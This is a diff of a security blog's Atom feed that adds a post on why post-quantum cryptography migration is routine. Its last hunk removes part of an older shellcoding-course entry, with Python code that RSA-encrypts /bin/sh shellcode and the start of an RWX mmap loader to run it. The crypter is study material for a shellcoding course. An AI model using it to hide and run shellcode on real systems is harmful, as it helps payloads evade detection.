@@ -1,5 +1,26 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>limbenjamin</title><link href="https://limbenjamin.com/" rel="alternate"/><link href="https://limbenjamin.com/feeds/all.atom.xml" rel="self"/><id>https://limbenjamin.com/</id><updated>2026-06-10T11:36:00+08:00</updated><entry><title>Why Lawyers May Be Better at Vibe Coding</title><link href="https://limbenjamin.com/articles/why-lawyers-may-be-better-at-vibecoding.html" rel="alternate"/><published>2026-06-10T11:36:00+08:00</published><updated>2026-06-10T11:36:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2026-06-10:/articles/why-lawyers-may-be-better-at-vibecoding.html</id><summary type="html">&lt;p&gt;There is a running joke in software circles that developers hate writing documentation. Ask a developer to build a feature and they will dive headfirst into the code. Ask them to document it afterwards and it will never get done. This is not a character flaw so much as a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;There is a running joke in software circles that developers hate writing documentation. Ask a developer to build a feature and they will dive headfirst into the code. Ask them to document it afterwards and it will never get done. This is not a character flaw so much as a reflection of how IT people are wired — they were drawn to the field because they like solving logical, deterministic problems, not because they enjoy crafting precise prose.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>limbenjamin</title><link href="https://limbenjamin.com/" rel="alternate"/><link href="https://limbenjamin.com/feeds/all.atom.xml" rel="self"/><id>https://limbenjamin.com/</id><updated>2026-07-03T14:18:00+08:00</updated><entry><title>PQC is not a big deal</title><link href="https://limbenjamin.com/articles/pqc-not-a-big-deal.html" rel="alternate"/><published>2026-07-03T14:18:00+08:00</published><updated>2026-07-03T14:18:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2026-07-03:/articles/pqc-not-a-big-deal.html</id><summary type="html">&lt;h1&gt;Post-Quantum Cryptography Is Not a Big Deal&lt;/h1&gt;
+&lt;p&gt;Every few months, a new wave of articles appears warning that quantum computers will soon render all existing encryption obsolete and that organisations need to act urgently. The reality is considerably more mundane. For most people and most organisations, the transition to post-quantum …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Post-Quantum Cryptography Is Not a Big Deal&lt;/h1&gt;
+&lt;p&gt;Every few months, a new wave of articles appears warning that quantum computers will soon render all existing encryption obsolete and that organisations need to act urgently. The reality is considerably more mundane. For most people and most organisations, the transition to post-quantum cryptography (PQC) is just routine IT hygiene dressed up in alarming language.&lt;/p&gt;
+&lt;h2&gt;What PQC Actually Means in Practice&lt;/h2&gt;
+&lt;p&gt;The concern is legitimate in principle. Algorithms like RSA and ECDH rely on mathematical problems — integer factorisation and discrete logarithm — that a sufficiently powerful quantum computer could solve using Shor's algorithm. NIST finalised its first set of PQC standards in 2024, namely ML-KEM, ML-DSA and SLH-DSA, which are designed to resist quantum attacks.&lt;/p&gt;
+&lt;p&gt;So far so good. But the question of what this means operationally is far less dramatic than the headlines suggest.&lt;/p&gt;
+&lt;h3&gt;Browsers&lt;/h3&gt;
+&lt;p&gt;For end users browsing the web, the migration to PQC ciphers is entirely invisible. Chrome has already been shipping experimental support for X25519Kyber768 as a hybrid key exchange since 2023, and other major browsers are following suit. For an organisation managing endpoints, this means patching browsers to a version that supports PQC negotiation. That is it. Patch management is already something every organisation should be doing on a regular cadence. There is nothing new here operationally.&lt;/p&gt;
+&lt;h3&gt;In-House Developed Applications&lt;/h3&gt;
+&lt;p&gt;For applications developed internally that make use of cryptographic libraries — whether OpenSSL, BoringSSL, libsodium or similar — the migration path is equally straightforward in principle. It involves updating to a library version that supports the new algorithms and testing that nothing breaks. Developers already do this regularly, either to pick up new features or to patch vulnerabilities. A zero-day in OpenSSL triggers an emergency update cycle. Adopting a new cipher suite is just a planned version bump. The key exchange or signature algorithm is typically abstracted away by the library, so the application code changes are minimal.&lt;/p&gt;
+&lt;h3&gt;Vendor Applications&lt;/h3&gt;
+&lt;p&gt;For commercial off-the-shelf software, the organisation has even less to do. The vendor will update their product on their own roadmap, as they always have done for cryptographic transitions in the past. TLS 1.0 was deprecated, RC4 was removed, SHA-1 certificates were distrusted — in each case, the vendors pushed updates and administrators applied them. PQC will follow the same pattern. The main action item is to check that vendors have a published roadmap and to factor that into procurement decisions.&lt;/p&gt;
+&lt;h2&gt;The Threat Model Does Not Apply to Most People&lt;/h2&gt;
+&lt;p&gt;The more significant point is that the realistic threat vector for quantum-enabled attacks is extremely narrow.&lt;/p&gt;
+&lt;p&gt;The attack scenario most frequently cited is "harvest now, decrypt later" (HNDL): an adversary intercepts and stores encrypted traffic today, intending to decrypt it once a sufficiently powerful quantum computer exists. This is a real concern for certain classes of data. But it requires the adversary to be able to intercept your traffic in the first place.&lt;/p&gt;
+&lt;p&gt;Traffic interception at scale requires the resources and positioning of a nation-state actor. The NSA, GCHQ, and their equivalents have the infrastructure to do this. A cybercriminal group running ransomware does not. If a nation-state adversary is targeting your communications specifically, you have much larger problems than your choice of key exchange algorithm — your threat model encompasses supply chain compromise, insider threats, physical access and a range of other vectors that are far easier to exploit than waiting a decade for a viable quantum computer.&lt;/p&gt;
+&lt;p&gt;For HNDL to be worth the effort, the data being harvested needs to retain its value far into the future — state secrets, long-term strategic intelligence, classified government communications. The average enterprise's TLS traffic, even if harvested today, is unlikely to be worth decrypting in ten years. By then the transactions will be irrelevant, the credentials will have been rotated and the data will have been superseded.&lt;/p&gt;
+&lt;h2&gt;Who Should Actually Be Concerned&lt;/h2&gt;
+&lt;p&gt;This does not mean PQC is irrelevant. Certain sectors have legitimate reasons to take it seriously ahead of the general curve. Defence and intelligence agencies protecting classified material with a decades-long shelf life, financial institutions processing transactions whose records must remain confidential for extended periods, and critical infrastructure operators whose systems are difficult to update once deployed all have reasons to prioritise this now.&lt;/p&gt;
+&lt;p&gt;For everyone else, the appropriate response is to ensure that PQC support is on the roadmap — for browsers via normal patch cycles, for in-house applications via library updates, for vendor software via procurement conversations — and to monitor the space without panic.&lt;/p&gt;
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;The cryptographic community has been working on this problem for years and the standards are now in place. The transition will happen incrementally as software is updated, which is exactly how every previous cryptographic migration has worked. There is no cliff edge. The organisations that should be worried about quantum adversaries already know who they are. For everyone else, keeping your software up to date is sufficient.&lt;/p&gt;</content><category term="articles"/><category term="Coding"/><category term="Security"/><category term="Server"/></entry><entry><title>Why Lawyers May Be Better at Vibe Coding</title><link href="https://limbenjamin.com/articles/why-lawyers-may-be-better-at-vibecoding.html" rel="alternate"/><published>2026-06-10T11:36:00+08:00</published><updated>2026-06-10T11:36:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2026-06-10:/articles/why-lawyers-may-be-better-at-vibecoding.html</id><summary type="html">&lt;p&gt;There is a running joke in software circles that developers hate writing documentation. Ask a developer to build a feature and they will dive headfirst into the code. Ask them to document it afterwards and it will never get done. This is not a character flaw so much as a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;There is a running joke in software circles that developers hate writing documentation. Ask a developer to build a feature and they will dive headfirst into the code. Ask them to document it afterwards and it will never get done. This is not a character flaw so much as a reflection of how IT people are wired — they were drawn to the field because they like solving logical, deterministic problems, not because they enjoy crafting precise prose.&lt;/p&gt;
 &lt;p&gt;With the rise of LLMs and vibe coding tools like Cursor, Claude Code and GitHub Copilot, this matters more than it used to.&lt;/p&gt;
 &lt;h2&gt;Prompting Is a Language Skill&lt;/h2&gt;
 &lt;p&gt;A lot has been written about prompt engineering as though it were some arcane technical discipline requiring knowledge of tokenisation and model internals. In practice, the most important skill is far more mundane: the ability to describe what you want precisely and unambiguously.&lt;/p&gt;
@@ -3919,265 +3940,4 @@ Where a corporation commits an offence under this Act, a person —
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
 
 &lt;p&gt;Employees who shirk their responsibilities may be held personally liable. This will be a good way to ensure people take their jobs seriously. Nonetheless, legislating is not sufficient, the government must be willing to enforce it. With the recent SingHealth case, several employees were found to be grossly negligent, contravening S14 Duty to report cybersecurity incident in respect of critical information infrastructure. However, no individual was held accountable.&lt;/p&gt;
-&lt;p&gt;Update (27-11-2019) - The government has &lt;a href="https://www.straitstimes.com/tech/all-govt-agencies-to-take-steps-to-safeguard-personal-data-measures-to-be-in-place-in-most?fbclid=IwAR2Z9AgqnVxaeZLdoYDQTMPae2b4IYmapyg1mAIPAJLb7UAy_n03p5Gmof0"&gt;announced&lt;/a&gt; that third-party vendors handling government data who misuse personal data will also come under the Personal Data Protection Act.&lt;/p&gt;</content><category term="articles"/><category term="Security"/><category term="Legal"/></entry><entry><title>SLAE64 #7 - Crypters</title><link href="https://limbenjamin.com/articles/slae64-7-crypters.html" rel="alternate"/><published>2019-05-25T20:21:00+08:00</published><updated>2019-05-25T20:21:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2019-05-25:/articles/slae64-7-crypters.html</id><summary type="html">&lt;p&gt;Since shellcode is usually very small in size, I have used RSA asymmetric encryption to encrypt the shellcode. Most of the code is boilerplate code so there is not much to talk about.&lt;/p&gt;
-&lt;p&gt;Encryptor.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
-&lt;span class="normal"&gt; 2&lt;/span&gt;
-&lt;span class="normal"&gt; 3&lt;/span&gt;
-&lt;span class="normal"&gt; 4&lt;/span&gt;
-&lt;span class="normal"&gt; 5&lt;/span&gt;
-&lt;span class="normal"&gt; 6&lt;/span&gt;
-&lt;span class="normal"&gt; 7&lt;/span&gt;
-&lt;span class="normal"&gt; 8&lt;/span&gt;
-&lt;span class="normal"&gt; 9&lt;/span&gt;
-&lt;span class="normal"&gt;10&lt;/span&gt;
-&lt;span class="normal"&gt;11&lt;/span&gt;
-&lt;span class="normal"&gt;12&lt;/span&gt;
-&lt;span class="normal"&gt;13&lt;/span&gt;
-&lt;span class="normal"&gt;14&lt;/span&gt;
-&lt;span class="normal"&gt;15&lt;/span&gt;
-&lt;span class="normal"&gt;16 …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Since shellcode is usually very small in size, I have used RSA asymmetric encryption to encrypt the shellcode. Most of the code is boilerplate code so there is not much to talk about.&lt;/p&gt;
-&lt;p&gt;Encryptor.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
-&lt;span class="normal"&gt; 2&lt;/span&gt;
-&lt;span class="normal"&gt; 3&lt;/span&gt;
-&lt;span class="normal"&gt; 4&lt;/span&gt;
-&lt;span class="normal"&gt; 5&lt;/span&gt;
-&lt;span class="normal"&gt; 6&lt;/span&gt;
-&lt;span class="normal"&gt; 7&lt;/span&gt;
-&lt;span class="normal"&gt; 8&lt;/span&gt;
-&lt;span class="normal"&gt; 9&lt;/span&gt;
-&lt;span class="normal"&gt;10&lt;/span&gt;
-&lt;span class="normal"&gt;11&lt;/span&gt;
-&lt;span class="normal"&gt;12&lt;/span&gt;
-&lt;span class="normal"&gt;13&lt;/span&gt;
-&lt;span class="normal"&gt;14&lt;/span&gt;
-&lt;span class="normal"&gt;15&lt;/span&gt;
-&lt;span class="normal"&gt;16&lt;/span&gt;
-&lt;span class="normal"&gt;17&lt;/span&gt;
-&lt;span class="normal"&gt;18&lt;/span&gt;
-&lt;span class="normal"&gt;19&lt;/span&gt;
-&lt;span class="normal"&gt;20&lt;/span&gt;
-&lt;span class="normal"&gt;21&lt;/span&gt;
-&lt;span class="normal"&gt;22&lt;/span&gt;
-&lt;span class="normal"&gt;23&lt;/span&gt;
-&lt;span class="normal"&gt;24&lt;/span&gt;
-&lt;span class="normal"&gt;25&lt;/span&gt;
-&lt;span class="normal"&gt;26&lt;/span&gt;
-&lt;span class="normal"&gt;27&lt;/span&gt;
-&lt;span class="normal"&gt;28&lt;/span&gt;
-&lt;span class="normal"&gt;29&lt;/span&gt;
-&lt;span class="normal"&gt;30&lt;/span&gt;
-&lt;span class="normal"&gt;31&lt;/span&gt;
-&lt;span class="normal"&gt;32&lt;/span&gt;
-&lt;span class="normal"&gt;33&lt;/span&gt;
-&lt;span class="normal"&gt;34&lt;/span&gt;
-&lt;span class="normal"&gt;35&lt;/span&gt;
-&lt;span class="normal"&gt;36&lt;/span&gt;
-&lt;span class="normal"&gt;37&lt;/span&gt;
-&lt;span class="normal"&gt;38&lt;/span&gt;
-&lt;span class="normal"&gt;39&lt;/span&gt;
-&lt;span class="normal"&gt;40&lt;/span&gt;
-&lt;span class="normal"&gt;41&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;cryptography.hazmat.backends&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;default_backend&lt;/span&gt;
-&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;cryptography.hazmat.primitives.asymmetric&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;rsa&lt;/span&gt;
-&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;cryptography.hazmat.primitives&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;serialization&lt;/span&gt;
-&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;cryptography.hazmat.primitives&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;hashes&lt;/span&gt;
-&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;cryptography.hazmat.primitives.asymmetric&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;padding&lt;/span&gt;
-
-
-&lt;span class="n"&gt;private_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;rsa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;generate_private_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
-    &lt;span class="n"&gt;public_exponent&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;65537&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;key_size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2048&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;backend&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;default_backend&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-&lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="n"&gt;public_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;private_key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;public_key&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-
-&lt;span class="n"&gt;pubpem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;public_key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;public_bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
-    &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;serialization&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PEM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="nb"&gt;format&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;serialization&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PublicFormat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SubjectPublicKeyInfo&lt;/span&gt;
-&lt;span class="p"&gt;)&lt;/span&gt;
-
-
-&lt;span class="n"&gt;privpem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;private_key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;private_bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
-    &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;serialization&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PEM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="nb"&gt;format&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;serialization&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PrivateFormat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PKCS8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;encryption_algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;serialization&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NoEncryption&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-&lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;privpem&lt;/span&gt;
-
-&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;public_key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
-    &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;padding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;OAEP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
-        &lt;span class="n"&gt;mgf&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;padding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MGF1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;hashes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SHA256&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;
-        &lt;span class="n"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;hashes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SHA256&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
-        &lt;span class="n"&gt;label&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;None&lt;/span&gt;
-    &lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;base64&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
-
-&lt;p&gt;Decryptor.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
-&lt;span class="normal"&gt; 2&lt;/span&gt;
-&lt;span class="normal"&gt; 3&lt;/span&gt;
-&lt;span class="normal"&gt; 4&lt;/span&gt;
-&lt;span class="normal"&gt; 5&lt;/span&gt;
-&lt;span class="normal"&gt; 6&lt;/span&gt;
-&lt;span class="normal"&gt; 7&lt;/span&gt;
-&lt;span class="normal"&gt; 8&lt;/span&gt;
-&lt;span class="normal"&gt; 9&lt;/span&gt;
-&lt;span class="normal"&gt;10&lt;/span&gt;
-&lt;span class="normal"&gt;11&lt;/span&gt;
-&lt;span class="normal"&gt;12&lt;/span&gt;
-&lt;span class="normal"&gt;13&lt;/span&gt;
-&lt;span class="normal"&gt;14&lt;/span&gt;
-&lt;span class="normal"&gt;15&lt;/span&gt;
-&lt;span class="normal"&gt;16&lt;/span&gt;
-&lt;span class="normal"&gt;17&lt;/span&gt;
-&lt;span class="normal"&gt;18&lt;/span&gt;
-&lt;span class="normal"&gt;19&lt;/span&gt;
-&lt;span class="normal"&gt;20&lt;/span&gt;
-&lt;span class="normal"&gt;21&lt;/span&gt;
-&lt;span class="normal"&gt;22&lt;/span&gt;
-&lt;span class="normal"&gt;23&lt;/span&gt;
-&lt;span class="normal"&gt;24&lt;/span&gt;
-&lt;span class="normal"&gt;25&lt;/span&gt;
-&lt;span class="normal"&gt;26&lt;/span&gt;
-&lt;span class="normal"&gt;27&lt;/span&gt;
-&lt;span class="normal"&gt;28&lt;/span&gt;
-&lt;span class="normal"&gt;29&lt;/span&gt;
-&lt;span class="normal"&gt;30&lt;/span&gt;
-&lt;span class="normal"&gt;31&lt;/span&gt;
-&lt;span class="normal"&gt;32&lt;/span&gt;
-&lt;span class="normal"&gt;33&lt;/span&gt;
-&lt;span class="normal"&gt;34&lt;/span&gt;
-&lt;span class="normal"&gt;35&lt;/span&gt;
-&lt;span class="normal"&gt;36&lt;/span&gt;
-&lt;span class="normal"&gt;37&lt;/span&gt;
-&lt;span class="normal"&gt;38&lt;/span&gt;
-&lt;span class="normal"&gt;39&lt;/span&gt;
-&lt;span class="normal"&gt;40&lt;/span&gt;
-&lt;span class="normal"&gt;41&lt;/span&gt;
-&lt;span class="normal"&gt;42&lt;/span&gt;
-&lt;span class="normal"&gt;43&lt;/span&gt;
-&lt;span class="normal"&gt;44&lt;/span&gt;
-&lt;span class="normal"&gt;45&lt;/span&gt;
-&lt;span class="normal"&gt;46&lt;/span&gt;
-&lt;span class="normal"&gt;47&lt;/span&gt;
-&lt;span class="normal"&gt;48&lt;/span&gt;
-&lt;span class="normal"&gt;49&lt;/span&gt;
-&lt;span class="normal"&gt;50&lt;/span&gt;
-&lt;span class="normal"&gt;51&lt;/span&gt;
-&lt;span class="normal"&gt;52&lt;/span&gt;
-&lt;span class="normal"&gt;53&lt;/span&gt;
-&lt;span class="normal"&gt;54&lt;/span&gt;
-&lt;span class="normal"&gt;55&lt;/span&gt;
-&lt;span class="normal"&gt;56&lt;/span&gt;
-&lt;span class="normal"&gt;57&lt;/span&gt;
-&lt;span class="normal"&gt;58&lt;/span&gt;
-&lt;span class="normal"&gt;59&lt;/span&gt;
-&lt;span class="normal"&gt;60&lt;/span&gt;
-&lt;span class="normal"&gt;61&lt;/span&gt;
-&lt;span class="normal"&gt;62&lt;/span&gt;
-&lt;span class="normal"&gt;63&lt;/span&gt;
-&lt;span class="normal"&gt;64&lt;/span&gt;
-&lt;span class="normal"&gt;65&lt;/span&gt;
-&lt;span class="normal"&gt;66&lt;/span&gt;
-&lt;span class="normal"&gt;67&lt;/span&gt;
-&lt;span class="normal"&gt;68&lt;/span&gt;
-&lt;span class="normal"&gt;69&lt;/span&gt;
-&lt;span class="normal"&gt;70&lt;/span&gt;
-&lt;span class="normal"&gt;71&lt;/span&gt;
-&lt;span class="normal"&gt;72&lt;/span&gt;
-&lt;span class="normal"&gt;73&lt;/span&gt;
-&lt;span class="normal"&gt;74&lt;/span&gt;
-&lt;span class="normal"&gt;75&lt;/span&gt;
-&lt;span class="normal"&gt;76&lt;/span&gt;
-&lt;span class="normal"&gt;77&lt;/span&gt;
-&lt;span class="normal"&gt;78&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;cryptography.hazmat.backends&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;default_backend&lt;/span&gt;
-&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;cryptography.hazmat.primitives&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;serialization&lt;/span&gt;
-&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;cryptography.hazmat.primitives&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;hashes&lt;/span&gt;
-&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;cryptography.hazmat.primitives.asymmetric&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;padding&lt;/span&gt;
-&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;ctypes&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;mmap&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
-
-&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create_shellcode_function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode_str&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;shellcode_bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode_str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
-    &lt;span class="c1"&gt;# Allocate memory with a RWX private anonymous mmap&lt;/span&gt;
-    &lt;span class="n"&gt;exec_mem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mmap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mmap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode_bytes&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
-                         &lt;span class="n"&gt;prot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mmap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PROT_READ&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;mmap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PROT_WRITE&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;mmap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PROT_EXEC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-                         &lt;span class="n"&gt;flags&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mmap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MAP_ANONYMOUS&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;mmap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MAP_PRIVATE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
